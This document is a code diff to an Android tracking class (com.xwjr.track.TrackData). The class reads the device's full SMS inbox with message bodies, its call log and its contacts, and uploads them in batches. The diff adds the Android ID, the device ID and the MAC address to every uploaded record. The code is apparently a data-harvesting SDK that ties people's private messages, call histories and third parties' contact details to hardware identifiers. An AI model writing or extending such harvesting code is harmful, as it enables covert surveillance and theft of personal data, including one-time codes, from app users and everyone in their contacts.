@@ -3,12 +3,14 @@ package com.xwjr.track;
 
 import android.Manifest;
 import android.content.ContentResolver;
+import android.content.Context;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Build;
 import android.provider.ContactsContract;
 import android.support.v4.app.ActivityCompat;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 
 import com.google.gson.Gson;
@@ -17,6 +19,8 @@ import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
+
+import static com.xwjr.track.TrackConfig.context;
 
 public class TrackData {
 
@@ -39,12 +43,27 @@ public class TrackData {
             e.printStackTrace();
         }
         try {
-            map.put("currentVersionName", AndroidUtil.getVersionName(TrackConfig.context));
+            map.put("currentVersionName", AndroidUtil.getVersionName(context));
         } catch (Exception e) {
             e.printStackTrace();
         }
         try {
             map.put("platform", "Android");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        try {
+            map.put("deviceUUID", AndroidUtil.getAndroidID());
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        try {
+            map.put("deviceID", AndroidUtil.getDeviceId());
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        try {
+            map.put("macAddress", AndroidUtil.getMacAddress(context));
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -77,6 +96,7 @@ public class TrackData {
             e.printStackTrace();
         }
 
+
         return map;
     }
 
@@ -84,15 +104,15 @@ public class TrackData {
     public static List<Map<String, String>> getSMSData(String mobile) {
 
         List<Map<String, String>> mapList = new ArrayList<>();
-        if (ActivityCompat.checkSelfPermission(TrackConfig.context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED
-                || ActivityCompat.checkSelfPermission(TrackConfig.context, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
+        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED
+                || ActivityCompat.checkSelfPermission(context, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
             Log.i(TrackConfig.logTag, "无读取短信权限");
             return mapList;
         }
 
         try {
             Uri SMS_INBOX = Uri.parse("content://sms/");
-            ContentResolver cr = TrackConfig.context.getContentResolver();
+            ContentResolver cr = context.getContentResolver();
             String[] projection = new String[]{"_id", "thread_id", "address", "protocol",
                     "read", "status", "service_center",
                     "person", "body", "date", "type"};
@@ -135,7 +155,7 @@ public class TrackData {
                 data.put("mobile", mobile);
                 mapList.add(data);
 
-                if (mapList.size() >=  TrackConfig.singleDataLimit) {
+                if (mapList.size() >= TrackConfig.singleDataLimit) {
                     TrackOperate.upload(mapList);
                     mapList.clear();
                 }
@@ -153,17 +173,17 @@ public class TrackData {
     public static List<Map<String, String>> getCallData(String mobile) {
 
         List<Map<String, String>> mapList = new ArrayList<>();
-        if (ActivityCompat.checkSelfPermission(TrackConfig.context, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED
-                || ActivityCompat.checkSelfPermission(TrackConfig.context, Manifest.permission.WRITE_CONTACTS) != PackageManager.PERMISSION_GRANTED
-                || ActivityCompat.checkSelfPermission(TrackConfig.context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED
-                || ActivityCompat.checkSelfPermission(TrackConfig.context, Manifest.permission.WRITE_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED
+                || ActivityCompat.checkSelfPermission(context, Manifest.permission.WRITE_CONTACTS) != PackageManager.PERMISSION_GRANTED
+                || ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED
+                || ActivityCompat.checkSelfPermission(context, Manifest.permission.WRITE_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
             Log.i(TrackConfig.logTag, "无读取通话记录权限");
             return mapList;
         }
 
         try {
             Uri uri = Uri.parse("content://call_log/calls");
-            ContentResolver cr = TrackConfig.context.getContentResolver();
+            ContentResolver cr = context.getContentResolver();
             String[] projection = new String[]{
                     "number",
                     "date",
@@ -196,7 +216,7 @@ public class TrackData {
                 data.put("call_type", type);
                 data.put("mobile", mobile);
                 mapList.add(data);
-                if (mapList.size() >=  TrackConfig.singleDataLimit) {
+                if (mapList.size() >= TrackConfig.singleDataLimit) {
                     TrackOperate.upload(mapList);
                     mapList.clear();
                 }
@@ -214,15 +234,15 @@ public class TrackData {
     public static List<Map<String, String>> getContactData(String mobile) {
 
         List<Map<String, String>> mapList = new ArrayList<>();
-        if (ActivityCompat.checkSelfPermission(TrackConfig.context, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED
-                || ActivityCompat.checkSelfPermission(TrackConfig.context, Manifest.permission.WRITE_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED
+                || ActivityCompat.checkSelfPermission(context, Manifest.permission.WRITE_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
             Log.i(TrackConfig.logTag, "无读取联系人权限");
             return mapList;
         }
 
         try {
             Map<String, String> data = getCommonMap();
-            ContentResolver cr = TrackConfig.context.getContentResolver();
+            ContentResolver cr = context.getContentResolver();
             Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
             if (null == cur) {
                 Log.i(TrackConfig.logTag, "联系人 == null");
@@ -316,7 +336,7 @@ public class TrackData {
                 data.put("mobile", mobile);
                 mapList.add(data);
 
-                if (mapList.size() >=  TrackConfig.singleDataLimit) {
+                if (mapList.size() >= TrackConfig.singleDataLimit) {
                     TrackOperate.upload(mapList);
                     mapList.clear();
                 }
